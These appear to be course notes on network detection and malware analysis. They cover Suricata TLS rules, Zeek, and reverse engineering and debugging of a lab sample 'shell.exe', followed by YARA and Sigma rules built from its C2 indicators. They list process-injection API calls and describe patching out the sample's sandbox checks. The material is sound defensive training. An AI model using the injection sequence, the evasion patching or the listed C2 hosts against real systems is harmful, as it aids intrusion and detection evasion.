1. **SSL/TLS Certificates**: During the SSL/TLS handshake, certificates exchange information such as issuer, subject, and domain, which remains unencrypted. Malicious actors may use certificates with unusual characteristics, enabling detection based on these anomalies.
2. **JA3 Hashing**: JA3 hashes provide a unique fingerprint of an SSL/TLS client by hashing specific attributes from the Client Hello message during the handshake. These hashes can help identify unique characteristics associated with certain malware families.

---

**Suricata Rule Examples for Encrypted Traffic Detection**

**Example 5: Detecting Dridex (TLS Encrypted)**

```
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"; flow:established,from_server; content:"|16|"; content:"|0b|"; within:8; byte_test:3,<,1200,0,relative; content:"|03 02 01 02 02 09 00|"; fast_pattern; content:"|30 09 06 03 55 04 06 13 02|"; distance:0; pcre:"/^[A-Z]{2}/R"; content:"|55 04 07|"; distance:0; content:"|55 04 0a|"; distance:0; pcre:"/^.{2}[A-Z][a-z]{3,}\\s(?:[A-Z][a-z]{3,}\\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\\.[A-Za-z]){1,3})\\.?[01]/Rs"; content:"|55 04 03|"; distance:0; byte_test:1,>,13,1,relative; content:!"www."; distance:2; within:4; pcre:"/^.{2}(?P<CN>(?:(?:\\d?[A-Z]?|[A-Z]?\\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\\.){0,2}?(?:\\d?[A-Z]?|[A-Z]?\\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs"; content:!"|2a 86 48 86 f7 0d 01 09 01|"; content:!"GoDaddy"; sid:2023476; rev:5;)
```

- **Purpose**: Detects Dridex trojan SSL certificates based on specific patterns within the SSL/TLS handshake.
- **Key Options**:
  - **Hex values**: `content:"|16|"; content:"|0b|"; within:8;` for the handshake and certificate type.
  - **Field identifiers**: `countryName` (2-letter code) and `commonName` fields are checked.
  - **OIDs**: ASN.1 sequences representing `countryName`, `localityName`, `organizationName`, etc.
  - **PCRE**: Checks for patterns in `commonName` with additional structure matching.

To test this rule, uncomment it in `local.rules` and run Suricata on `dridex.pcap`.

**Example 6: Detecting Sliver (TLS Encrypted)**

```
alert tls any any -> any any (msg:"Sliver C2 SSL"; ja3.hash; content:"473cd7cb9faa642487833865d516e578"; sid:1002; rev:1;)
```

- **Purpose**: Detects Sliver C2 traffic by matching a known JA3 hash.
- **Key Options**:
  - **ja3.hash**: Looks for the specific JA3 hash associated with Sliver.

To obtain the JA3 hash, use the `ja3` tool on the `sliverenc.pcap` file. Uncomment this rule in `local.rules` and run Suricata on `sliverenc.pcap` to validate detection.

---

For further information on Suricata’s SSL/TLS detection capabilities, explore additional resources on the [Suricata documentation](https://docs.suricata.io/en/latest/rules/index.html).

#### **Zeek Fundamentals**

**Zeek** is an open-source network traffic analyzer widely used for identifying suspicious or malicious network activity. However, Zeek is also effective for network troubleshooting and measurement. It generates log files that provide detailed insights into all network activities, making it invaluable for cybersecurity teams (blue teams). Logs produced by Zeek include detailed records of connections and application-layer activities, such as DNS queries, HTTP sessions, etc. Additionally, Zeek’s functions support extensive analysis and detection capabilities beyond logging.

Zeek’s standout feature is its powerful scripting language, enabling users to create custom scripts akin to Suricata rules. This language allows blue teams to develop tailored network analysis and intrusion detection strategies.

Rather than relying solely on signature-based detection, Zeek offers **semantic misuse detection**, **anomaly detection**, and **behavioral analysis**.

**Zeek's Operation Modes**

Zeek operates in several modes:

- **Fully passive traffic analysis**
- **libpcap interface** for packet capture
- **Real-time and offline analysis** (e.g., PCAP-based)
- **Cluster support** for large-scale deployments

**Zeek's Architecture**

Zeek's architecture consists of two main components:

1. **Event Engine (Core)**:
  - Transforms the incoming packet stream into a series of high-level events describing network activity.
  - These events are policy-neutral; they describe what happened without interpreting it (e.g., an HTTP request is recorded as an `http_request` event).
2. **Script Interpreter**:
  - Executes event handlers written in Zeek's scripting language (Zeek scripts), which specify site security policies.
  - Events generated by Zeek’s core are processed sequentially.

Zeek events are mainly defined in `.bif` files located in `/scripts/base/bif/plugins/`. For a comprehensive event list, refer to [Zeek Events Documentation](https://docs.zeek.org/en/stable/scripts/base/bif/).

**Zeek Logs**

When running Zeek in offline mode with a PCAP file, logs are saved to the current directory. Common logs include:

- **conn.log**: Logs details on IP, TCP, UDP, and ICMP connections.
- **dns.log**: Logs DNS queries and responses.
- **http.log**: Logs HTTP request and response details.
- **ftp.log**: Logs FTP requests and responses.
- **smtp.log**: Logs SMTP transactions, including sender and recipient details.

**Example (http.log):** Contains data fields like `host`, `uri`, `referrer`, `user_agent`, and `status_code`.

For a complete list of Zeek logs and fields, see [Zeek Logs Documentation](https://docs.zeek.org/en/master/logs/index.html).

Zeek compresses log files hourly using gzip and moves older logs to a date-named directory (YYYY-MM-DD format). To manage these compressed logs, use tools like `gzcat` (for printing) and `zgrep` (for searching within logs). Learn more [here](https://blog.rapid7.com/2016/06/02/working-with-bro-logs-queries-by-example/).

Zeek also provides `zeek-cut`, a utility for extracting specific columns from Zeek logs, facilitating easier log analysis.

**Zeek Key Features**

Key features enhancing Zeek's effectiveness:

- Extensive logging of network activities
- Analysis of application-layer protocols (e.g., HTTP, DNS, FTP, SMTP, SSH, SSL)
- Ability to inspect file contents exchanged over application-layer protocols
- IPv6 support
- Detection and analysis of tunnels
- Sanity checks in protocol analysis
- IDS-like pattern matching
- Powerful scripting language supporting custom analysis tasks and state management
- ASCII log output by default, with options for ElasticSearch and DataSeries
- Real-time integration of external inputs
- C library interface for sharing Zeek events with other programs
- Ability to trigger external processes from within the scripting language

For Zeek examples, scripting basics, and use cases, visit [Zeek Examples](https://docs.zeek.org/en/stable/examples/index.html). For a quick start, check the [Zeek Quick Start Guide](https://docs.zeek.org/en/stable/quickstart/index.html).

**9. Introduction to Malware Analysis**

#### **Code Analysis**

**Reverse Engineering** allows analysts to understand a malware’s functionality and behavior by dissecting its compiled machine code. This often involves converting machine code into assembly language and interpreting the operations without executing them.

In code analysis, we aim to:

1. **Disassemble** the code to review structure and logic without triggering any actions.
2. **Identify key functions** and potential Indicators of Compromise (IOCs).
3. **Explore control flow** for critical functions, such as sandbox detection and persistence mechanisms.

---

**Tools for Code Analysis**

1. **Disassemblers** - Used for static analysis of machine code (e.g., IDA, Ghidra, Cutter).
2. **Debuggers** - Enable interactive code execution and control (e.g., x32dbg, x64dbg, OllyDbg).

---

**Code Analysis Example: Analyzing*****shell.exe***

The *shell.exe* malware sample demonstrates various techniques, such as sandbox detection and process injection, which can be decoded via disassembly in IDA.

**Importing and Disassembling*****shell.exe*****in IDA**

1. **Load shell.exe into IDA**:
  - Open IDA as an administrator.
  - Load the executable and let IDA analyze the binary.
2. **Navigate Views**:
  - **Graph View**: Visualizes function control flow, helping to identify execution paths and relationships.
  - **Text View**: Presents the assembly code line-by-line with memory addresses, useful for detailed instruction review.

**Key Analysis Areas**

1. **Identifying Main Function**:
  - IDA’s start function shows initial setup. Track calls and jumps to find the main function.
  - This may include initialization tasks and setup of stack frames.
2. **Sandbox Detection Techniques**:
  - The *shell.exe* sample queries the registry for *VMware Tools* (indicative of a virtual environment). The *RegOpenKeyExA* and *RegQueryValueExA* functions in the disassembly reveal registry-based sandbox detection.
  - IDA reveals the function path:
    ```
    leardx, aSoftwareVmware
    movrcx,0FFFFFFFF80000002h
    callcs:RegOpenKeyExA
    ```
  - Possible IOC: `SOFTWARE\\\\VMware, Inc.\\\\VMware Tools` registry path.
3. **Timing Mechanisms**:
  - Calls to *GetSystemTimeAsFileTime*, *GetCurrentProcessId*, and *QueryPerformanceCounter* may indicate timing mechanisms, possibly for sleep delays or checks.
  - IDA also displays sleep instructions or delay loops that the malware may use to evade detection.
4. **Network Connections**:
  - The *shell.exe* sample uses *getaddrinfo* and *WSAStartup* for internet-related operations. It may check for network connectivity to avoid sandbox restrictions.
  - Example IOC: Domain `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`.
5. **Persistence Mechanisms**:
  - The sample writes entries into the Windows registry key `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence.
  - Potential IOC: Registry key path with entry for `svchost.exe` under `WindowsUpdater`.
6. **Process Injection**:
  - *shell.exe* spawns a *notepad.exe* process, allocating memory within it using *VirtualAllocEx*, and injects shellcode using *WriteProcessMemory* followed by *CreateRemoteThread*.
  - Injection functions observed:
    ```
    call VirtualAllocEx
    call WriteProcessMemory
    call CreateRemoteThread
    ```

**Using IDA’s Function Flow and Xref Graphs**

- **Generating Function Call Flow Graph**:
  - IDA can visualize inter-function relationships via *View → Graphs → Function calls*.
  - **Function-specific graphs**: Right-click in disassembly view, select either *Xrefs graph to...* or *Xrefs graph from...* to see specific function calls.

---

**Debugging Strategy for*****shell.exe***

1. **Setting Breakpoints**:
  - Place breakpoints on key API calls (e.g., *RegOpenKeyExA*, *VirtualAllocEx*).
2. **Execution Flow Control**:
  - Step through code execution to observe behavior in real-time, validating suspected sandbox checks or persistence mechanisms.
3. **Dynamic Analysis Follow-up**:
  - Debugging after disassembly allows validation of initial findings and confirms IOC behaviors.

---

**Key IOCs Identified**

1. **Registry-Based Sandbox Detection**:
  - `SOFTWARE\\VMware, Inc.\\VMware Tools`
2. **Network Connectivity Check**:
  - Domain: `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com`
  - IP Address: `45.33.32.156`
  - Port: `31337`
3. **Persistence Technique**:
  - Registry Path: `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`
  - Executable: `svchost.exe` in TEMP directory.
4. **External Network Resource**:
  - URL: `http[:]//ms-windows-update[.]com/svchost[.]exe`

#### **Creating Detection Rules**

Detecting malware involves defining rules to identify indicators in files, processes, or logs. Two essential tools for this task are **YARA** (for file-based detection) and **Sigma** (for log-based detection in SIEMs). Below is a structured guide to creating detection rules for a malware sample.

**YARA Rules**

YARA, a rule-based pattern-matching tool, helps create custom rules for detecting specific characteristics within files. Our example uses *shell.exe*, which exhibited sandbox evasion messages like "Sandbox detected."

**Basic YARA Rule Example**

A simple rule to detect the "Sandbox detected" message:

```
rule Shell_Sandbox_Detection {
    strings:
        $sandbox_string = "Sandbox detected"
condition:
        $sandbox_string
}
```

**Enhanced YARA Rule Creation with yarGen**

To generate a more robust rule, we use **yarGen**, a tool that automates YARA rule creation by extracting unique strings and patterns.

1. **Set Up Test Directory**:
  ```
  mkdir /home/htb-student/Samples/MalwareAnalysis/Test
  cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
  ```
2. **Run yarGen**:
  ```
  cd /home/htb-student/yarGen-0.23.4
  sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
  ```
3. **Generated Rule Example**: A file named `yargen_rules.yar` is generated, containing unique patterns for *shell.exe*:
  ```
  rule _home_htb_student_Samples_MalwareAnalysis_Test_shell {
     meta:
        description = "Test - file shell.exe"
        author = "yarGen Rule Generator"
        date = "2023-08-02"
        hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
     strings:
        $x1 = "C:\\\\Windows\\\\System32\\\\cmd.exe" fullword ascii
        $s2 = "<http://ms-windows-update.com/svchost.exe>" fullword ascii
        $s3 = "45.33.32.156" fullword ascii
        $s4 = "[-] Error code is : %lu" fullword ascii
        $s5 = "Connection sent to C2" fullword ascii
        $s6 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
  condition:
        uint16(0) == 0x5a4d and filesize < 60KB and 3 of ($s*)
  }
  ```
4. **Use the Rule for Detection**:
  ```
  yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/
  ```
  Output should confirm detection if `shell.exe` is present in the specified directory.

**YARA Resources**

- **Documentation**: [YARA Documentation](https://yara.readthedocs.io/en/stable/writingrules.html)
- **Community Rules**: [InQuest’s Awesome YARA](https://github.com/InQuest/awesome-yara)

---

**Sigma Rules**

**Sigma** is a rule format for detecting security threats in SIEM systems. Sigma rules standardize detection across platforms, helping detect malicious patterns or events based on log analysis.

**Basic Sigma Rule Example**

Below is an example Sigma rule to detect a file named `svchost.exe` dropped in the `Temp` folder:

```
title: Suspicious File Drop in Users Temp Location
status: experimental
description: Detects suspicious activity where a file is dropped in the temp location

logsource:
    category: process_creation
detection:
    selection:
        TargetFilename:
            - '*\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe'
    condition: selection
    level: high

falsepositives:
    - Legitimate exe file drops in temp location
```

**Example Detection Rule with Sysmon Logs**

**Sysmon** provides detailed event logging on processes, files, and network connections, which can be used to create more complex Sigma rules. Example rule for process creation in response to *shell.exe* behavior:

1. **Sysmon Process Creation Log Rule**:
  ```
  title: Suspicious Process Creation for Registry Modification
  logsource:
     category: process_creation
     product: windows
  detection:
     selection:
        Image: 'C:\\\\Windows\\\\System32\\\\cmd.exe'
        CommandLine: '*ping 127.0.0.1 -n 5*'
     condition: selection
  level: high
  description: Detects process creation with command line arguments related to sleep or delay commands
  ```
2. **Sysmon Network Connection Log Rule**:
  ```
  title: Suspicious Network Connection to C2 IP
  logsource:
     category: network_connection
     product: windows
  detection:
     selection:
        DestinationIp: '45.33.32.156'
        DestinationPort: 31337
     condition: selection
  level: high
  description: Detects network connections to a known C2 server IP
  ```

**Sigma Resources**

- **Documentation**: [Sigma Specification](https://github.com/SigmaHQ/sigma/wiki/Specification)
- **Community Rules**: [SigmaHQ Rules](https://github.com/SigmaHQ/sigma/tree/master/rules)

---

**References and Additional Resources**

- **Yara Documentation**: [YARA Rules](https://yara.readthedocs.io/en/stable/writingrules.html)
- **Sigma Documentation**: [Sigma Rules](https://github.com/SigmaHQ/sigma/wiki/Specification)
- **DFIR Report**: [YARA and Sigma Rules by DFIR](https://github.com/The-DFIR-Report)

#### **Debugging**

Debugging, an interactive approach to malware analysis, enhances understanding of code behavior by enabling real-time examination. By uniting static analysis insights from tools like IDA with debugging techniques, analysts gain a holistic view of malware functionality, sandbox evasion mechanisms, and Indicators of Compromise (IOCs).

**Tools for Debugging**

1. **x64dbg** - A debugger for analyzing and controlling 64-bit executables, complete with:
  - **Disassembly View**: Shows the program’s assembly code.
  - **Registers and Stack View**: Reveals current CPU register values and stack frame.
  - **Memory Dump**: Visualizes program memory for analyzing data structures and variables.
2. **INetSim** - Simulates internet services in a controlled environment, enabling malware to interact with fake DNS, HTTP, and other services safely.

---

**Setting Up Debugging in x64dbg**

**Loading*****shell.exe*****in x64dbg**

1. **Launch x64dbg** and select **File > Open**.
2. Navigate to and open *shell.exe*.
3. The program halts at its entry point in the disassembly view, with the default breakpoint set.
4. To begin, press **F9** or click **Run**.

---

**Simulating Internet Services with INetSim**

INetSim configures fake internet services, capturing and responding to network requests from the malware sample.

**Configuring INetSim**

1. **Edit Configuration**:
  ```
  sudo nano /etc/inetsim/inetsim.conf
  ```
  - Set `service_bind_address` and `dns_default_ip` to the machine’s IP.
  - Configure DNS defaults:
    ```
    dns_default_hostname www
    dns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
    ```
2. **Start INetSim**:
  ```
  sudo inetsim
  ```
3. Ensure the target’s DNS is pointed to the INetSim-running machine.

---

**Bypassing Sandbox Checks**

Malware frequently checks for virtual or sandbox environments before execution. Here, we patch these checks in x64dbg.

**Step-by-Step Sandbox Bypass**

1. **Copy Address from IDA**:
  - In IDA, identify the address of the *cmp* instruction for registry checks.
  - Use **Go to > Expression** in x64dbg (Ctrl+G) to locate this address in x64dbg.
2. **Identify and Patch Comparison Instruction**:
  - Find the `cmp` instruction related to `Sandbox detected` (e.g., address `0x4032C8`).
  - Modify `cmp [rsp+148h+Type], 1` to `cmp [rsp+148h+Type], 0` using **Spacebar** to edit.
3. **Patch Sandbox Strings in String References**:
  - **Search for > Current Module > String references** to find `Sandbox detected`.
  - Set breakpoints on strings like `0x4032F13`, and change conditional jumps (e.g., `je` to `jne`).

---

**Patching and Saving the Bypassed Executable**

After successful patching:

1. **Save the Patched Executable**:
  - Press **Ctrl+P** in x64dbg and select **Patch File**.

The saved file will bypass sandbox checks in future executions, allowing all behaviors to manifest.

---

**Network Traffic Analysis**

**Capturing Malware Traffic with Wireshark**

1. Start **Wireshark** to capture all network traffic generated by the malware.
2. Analyze:
  - **DNS Requests**: Observing connections to domains like `ms-windows-update[.]com`.
  - **HTTP Requests**: Malware appends the computer hostname to the `User-Agent`.
  - **HTTP Response**: INetSim’s response, like the default binary, will trigger messages in malware.

---

**Process Injection Analysis**

Process injection is a common technique where malware injects code into another process (e.g., *notepad.exe*).

**Setting Breakpoints for Injection Functions**

1. In **x64dbg**:
  - Search and set breakpoints on `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`.
2. **Attach to notepad.exe**:
  - Open another x64dbg instance, **Attach to Process** (Alt+A), and select *notepad.exe*.
  - Monitor injected code in *notepad.exe*’s memory using memory dumps.
3. **Verify Shellcode Injection**:
  - Examine *WriteProcessMemory*’s `lpBaseAddress` parameter to identify injection address.
  - Copy and paste this address into *notepad.exe*'s memory dump view.
4. **Inspect Injected Shellcode**:
  - Run *shell.exe*, observe the populated memory, and save the shellcode for analysis.

#### **Dynamic Analysis**

Dynamic analysis involves observing malware behavior in a controlled environment by executing the malware and logging its activities. This approach allows us to see real-time changes to the system, unlike static analysis, where we examine the malware without execution.

---

**Key Steps in Dynamic Analysis**

1. **Environment Setup**:
  - Create an isolated virtual machine (VM) to safely execute malware without risk to the broader network. Mimic real-world systems, including common applications, user data, and network configurations.
2. **Baseline Capture**:
  - Take a system snapshot before executing malware. Record details on system files, registry states, running processes, and network configurations to use as a reference for changes introduced by the malware.
3. **Tool Deployment (Pre-Execution)**:
  - Use monitoring tools like **ProcMon** (Process Monitor) from Sysinternals for logging system events (file access, registry changes, etc.).
  - Additional tools include **Wireshark** and **tcpdump** for network traffic, **Regshot** for registry snapshots, and simulators like **INetSim**, **FakeDNS**, or **FakeNet-NG**.
4. **Malware Execution**:
  - With logging tools active, execute the malware sample within the VM. Allow it to run long enough to record meaningful behavioral data.
5. **Observation and Logging**:
  - Monitor and log malware actions, focusing on process creation, file and registry modifications, and network traffic.
6. **Data Analysis**:
  - After stopping the malware and logging tools, compare the system's post-execution state with the baseline to identify modifications.

---

**Dynamic Analysis with Noriben**

**Noriben** simplifies dynamic analysis by acting as a Python wrapper for ProcMon, filtering and categorizing output to focus on suspicious behaviors.

**Steps for Using Noriben**

1. **Setup Noriben**:
  ```
  C:\\Tools\\Noriben-master> python .\\Noriben.py
  ```
  - Open the command line, navigate to `C:\\Tools\\Noriben-master`, and launch Noriben:
2. **Launch ProcMon**:
  - Noriben initiates ProcMon with preconfigured filters to reduce irrelevant data and highlight malicious indicators.
3. **Execute the Malware**:
  - Run the malware sample (e.g., `shell.exe` in `C:\\Samples\\MalwareAnalysis`). Allow it to execute, then terminate it after logging activity.
4. **Stop Logging**:
  - End the session in the Noriben Command Prompt with `Ctrl+C`, which stops ProcMon and saves data.
5. **Review Report**:
  - Noriben produces a `.txt` report summarizing suspicious activity by categorizing file, process, registry, and network interactions.

---

**Using ProcMon Directly for Detailed Insights**

Sometimes, Noriben’s filtering may omit certain details. In such cases, manually run ProcMon with a broader configuration to capture all activities:

1. **Open ProcMon**:
  - Launch **ProcMon** from `C:\\Tools\\sysinternals` and configure it with a default, inclusive setup.
2. **Set Filters**:
  - Use `Ctrl+L` to open the filter settings. For example, filter for `Process Name` as `shell.exe` to isolate its actions.
3. **Execute Malware**:
  - Re-run `shell.exe` and allow ProcMon to log its activity.
4. **Examine Detection Techniques**:
  - Review the ProcMon output. Malware may attempt sandbox detection by querying the registry for items like **VMware Tools** (e.g., registry keys indicating a virtual machine).

---

**Additional Dynamic Analysis Tools**

- **Sandboxes**: Automated analysis tools like **Cuckoo Sandbox**, **Joe Sandbox**, or **FireEye’s Dynamic Threat Intelligence** cloud for behavior reports.
  - *Note*: Some advanced malware can detect sandbox environments and may alter its behavior to evade detection.

---

**Example Commands and Configurations**

**Start Noriben**:

```
python Noriben.py
```

**Run ProcMon with default configuration**:

1. Launch ProcMon.
2. Apply filter (`Ctrl+L`): Set Process Name to `shell.exe` and click `Apply`.
3. Observe results for malware behavior, such as registry queries that may reveal sandbox detection attempts.

#### **Introduction To Malware & Malware Analysis**

This module provides a foundational overview of malware analysis, aimed at enabling SOC analysts to perform essential malware analysis tasks, particularly focusing on Windows-based malware.

**Types of Malware**

1. **Viruses**: Infect host files and spread by attaching to legitimate programs.
2. **Worms**: Self-replicating, spread autonomously over networks.
3. **Trojans**: Disguised as legitimate software, create backdoors for unauthorized access.
4. **Ransomware**: Encrypts data and demands ransom for decryption keys.
5. **Spyware**: Collects user data without consent, tracking activities or capturing credentials.
6. **Adware**: Displays intrusive ads and may collect browsing data.
7. **Botnets**: Networks of compromised devices used for attacks or malware distribution.
8. **Rootkits**: Gain control over OS components, concealing malicious activity.
9. **Backdoors/RATs**: Enable remote access and prolonged control of a compromised system.
10. **Droppers**: Carry additional malware payloads, ensuring stealthy installation.
11. **Information Stealers**: Focused on stealing sensitive data like passwords and PII.

**Malware Samples Resources**

For malware research, handling samples should be done in secure, controlled environments. Notable sources include:

- **VirusShare**
- **Hybrid Analysis**
- **TheZoo (GitHub)**
- **[Malware-Traffic-Analysis.net](http://malware-traffic-analysis.net/)**
- **VirusTotal**
- **ANY.RUN**
- **Contagio Malware Dump**
- **VX Underground**

**Malware/Evidence Acquisition**

During investigations, disk imaging and memory acquisition tools are vital. Recommended tools include:

**Disk Imaging Tools**

- **FTK Imager**: Widely used for creating disk images.
- **OSFClone**: Open-source, supports multiple file systems.
- **DD/DCFLDD**: Command-line tools on Unix-based systems, with forensic-focused features.

**Memory Acquisition Tools**

- **DumpIt**: Simple tool for memory dumps on Windows and Linux.
- **MemDump**: Command-line utility for RAM capture.
- **Belkasoft RAM Capturer**: Effective for Windows systems, even with anti-debugging.
- **Magnet RAM Capture**: User-friendly tool by Magnet Forensics.
- **LiME**: Linux Memory Extractor, effective for volatile memory acquisition.

**Additional Evidence Acquisition**

- **KAPE**: Targeted artifact collection, quick analysis.
- **Velociraptor**: Host-based incident response tool using Velocidex Query Language (VQL).

**Malware Analysis: Definition, Purpose, & Techniques**

**Malware Analysis** is the study of malware to understand its behavior, origin, and impact. This helps in detection, reverse engineering, behavioral analysis, and threat intelligence gathering.

**Goals of Malware Analysis**

- **Detection and Classification**: Identifying and categorizing malware to develop detection rules.
- **Reverse Engineering**: Disassembling code to understand functionality, encryption, and control infrastructure.
- **Behavioral Analysis**: Observing malware’s interactions with systems (e.g., file changes, network connections).
- **Threat Intelligence**: Gathering attacker tactics, techniques, and malware origins.

**Common Malware Analysis Techniques**

1. **Static Analysis**: Analyzing malware code without execution to gain initial insights.
2. **Dynamic Analysis**: Executing malware in a controlled environment to observe behavior.
3. **Code Analysis**: Reverse engineering code to understand structure and functionality.
4. **Memory Analysis**: Examining system memory to detect runtime modifications.
5. **Malware Unpacking**: Extracting hidden code from packed malware to reveal actual functions.

#### **Static Analysis On Linux**

Static analysis involves examining malware without executing it. It helps identify malware properties, such as file type, strings, hashes, embedded elements, and packer information, serving as a foundation for deeper analysis.

**Key Static Analysis Components**

- **File Type**: Identifying actual file types prevents reliance on potentially misleading file extensions.
- **File Hashes**: Unique identifiers for tracking malware samples.
- **Strings**: Extracted ASCII and Unicode strings provide insights into potential malware functionality.
- **Embedded Elements**: Identifiable elements (like domains or file paths).
- **Packer Information**: Detects if malware is packed or compressed, which may obscure analysis.
- **Imports/Exports**: Identifies imported and exported functions.
- **Assembly Code**: Provides low-level insights.

---

**File Type Identification**

To identify the actual file type:

```
file /path/to/malware.exe
```

Example result:

```
PE32 executable (GUI) Intel 80386, for MS Windows
```

Alternatively, inspect the file header:

```
hexdump -C /path/to/malware.exe | more
```

Look for the **"MZ"** (4D 5A) magic number to confirm it's a Windows executable.

---

**Malware Fingerprinting**

**File Hashes**

Generate MD5 or SHA256 hashes to uniquely identify malware samples:

```
md5sum /path/to/malware.exe
sha256sum /path/to/malware.exe
```

Use these hashes to cross-reference with online databases like VirusTotal.

**Import Hash (IMPHASH)**

IMPHASH identifies similar malware by hashing imports in alphabetical order. Example Python code:

```
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
imphash = pe.get_imphash()
print(imphash)
```

Run the script:

```
python3 imphash_calc.py /path/to/malware.exe
```

**Fuzzy Hashing (SSDEEP)**

Calculate SSDEEP for similarity matching:

```
ssdeep /path/to/malware.exe
```

**Section Hashing (Hashing PE Sections)**

Hashing individual PE sections helps detect small changes in malware. Example Python code:

```
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.get_hash_md5())
    print(section.Name, "SHA256 hash:", section.get_hash_sha256())
```

Run the script:

```
python3 section_hashing.py /path/to/malware.exe
```

---

**String Analysis**

Strings help reveal filenames, IPs, registry paths, API functions, etc. Extract strings:

```
strings -n 15 /path/to/malware.exe
```

To analyze obfuscated strings, use FLOSS:

```
floss /path/to/malware.exe
```

---

**Unpacking UPX-Packed Malware**

Packed malware obfuscates or compresses code. Detect UPX-packed malware by looking for **UPX** in the `strings` output.

Unpack with UPX:

```
upx -d -o /path/to/unpacked_malware.exe /path/to/malware.exe
```

After unpacking, rerun `strings` to see unobfuscated data:

```
strings /path/to/unpacked_malware.exe
```

#### **Static Analysis On Windows**

Static analysis on Windows mirrors similar tasks to Linux but uses Windows-specific tools to identify file properties, hashes, strings, and packing details. This guide covers essential commands and tools for Windows-based static malware analysis.

---

**Key Static Analysis Components on Windows**

- **File Type Identification**: Use tools to verify executable types (e.g., PE files).
- **File Hashing**: Generate unique file hashes (MD5, SHA256) for malware tracking.
- **Import Hashing (IMPHASH)**: A hash based on imported functions to identify similar samples.
- **Fuzzy Hashing (SSDEEP)**: Content similarity hashing for slight variations.
- **Section Hashing**: Hashing individual PE sections to detect changes.
- **String Analysis**: Extracts embedded text strings, often revealing useful insights.
- **Unpacking Packed Malware**: Remove obfuscation to reveal underlying code.

---

**File Type Identification**

Use **CFF Explorer** (located at `C:\\Tools\\Explorer Suite`) to check the file type and confirm it as a Windows executable by looking for the ASCII string "MZ" in the file header.

---

**Malware Fingerprinting**

**File Hashing with PowerShell**

Generate MD5 or SHA256 hashes for identifying malware samples:

```
Get-FileHash -Algorithm MD5 C:\\Samples\\MalwareAnalysis\\malware.exe
Get-FileHash -Algorithm SHA256 C:\\Samples\\MalwareAnalysis\\malware.exe
```

**Import Hash (IMPHASH) Calculation**

IMPHASH provides a consistent hash for identical imports across similar samples. It can be calculated using **pefile** in Python:

```
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
print(pe.get_imphash())
```

Run the script:

```
python imphash_calc.py C:\\Samples\\MalwareAnalysis\\malware.exe
```

**Fuzzy Hashing (SSDEEP)**

Use SSDEEP for similarity matching of malware variations:

```
C:\\Tools\\ssdeep-2.14.1\\ssdeep.exe C:\\Samples\\MalwareAnalysis\\malware.exe
```

**Section Hashing with Python**

Section hashing is useful for identifying modified sections in similar malware samples. Example code using **pefile**:

```
import sys
import pefile

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.get_hash_md5())
    print(section.Name, "SHA256 hash:", section.get_hash_sha256())
```

To use section hashing, tools like **pestudio** (located at `C:\\Tools\\pestudio\\pestudio`) can also be helpful.

---

**String Analysis**

Extracting strings provides insights into the malware’s behavior, such as IPs, file paths, or API calls. Use **Strings** from Sysinternals:

```
C:\\Sysinternals\\strings.exe C:\\Samples\\MalwareAnalysis\\malware.exe
```

Alternatively, use **FLOSS** for deobfuscating strings:

```
C:\\FLOSS\\floss.exe C:\\Samples\\MalwareAnalysis\\malware.exe
```

---

**Unpacking UPX-Packed Malware**

UPX packing often conceals code. Identify packed files by looking for "UPX" in the `strings` output. Unpack with UPX:

```
C:\\Tools\\upx\\upx-4.0.2-win64\\upx.exe -d -o unpacked_malware.exe C:\\Samples\\MalwareAnalysis\\packed\\malware.exe
```

After unpacking, rerun `strings` to examine the revealed contents:

```
C:\\Sysinternals\\strings.exe unpacked_malware.exe
```

#### **Windows Internals**

Understanding Windows internals is crucial for malware analysis, as it provides insight into system operations and helps identify malware behavior.

**Windows Operating Modes**

- **User Mode**: Limited access; applications interact with the OS via APIs. Malware in user mode can manipulate files, registry settings, and attempt privilege escalation.
- **Kernel Mode**: High privilege; unrestricted access to hardware and system functions. Kernel-mode malware can alter system behavior, intercept calls, and conceal itself.

**Windows Architecture Overview**

**User-Mode Components**

1. **System Support Processes**: Essential system processes like `winlogon.exe`, `smss.exe`, and `services.exe`.
2. **Service Processes**: Background services, e.g., Windows Update and Task Scheduler.
3. **User Applications**: Standard applications use APIs routed via `NTDLL.DLL` for kernel interaction.
4. **Environment Subsystems**: Provides environments for specific processes (e.g., Win32, POSIX).
5. **Subsystem DLLs**: Maps documented functions to native calls (e.g., `kernelbase.dll`, `user32.dll`).

**Kernel-Mode Components**

1. **Executive**: Manages OS aspects like I/O, object, security, and processes.
2. **Kernel**: Handles low-level functions like scheduling and synchronization.
3. **Device Drivers**: Enables hardware interaction.
4. **Hardware Abstraction Layer (HAL)**: Standardizes hardware communication.
5. **Win32k.sys**: Manages the GUI and visual rendering.

**Windows API Call Flow**

Malware often uses Windows API calls to interact with system components for malicious tasks. Understanding API flow is key for detecting malware actions.

- **Example**: `ReadProcessMemory` API, which allows reading other processes' memory.
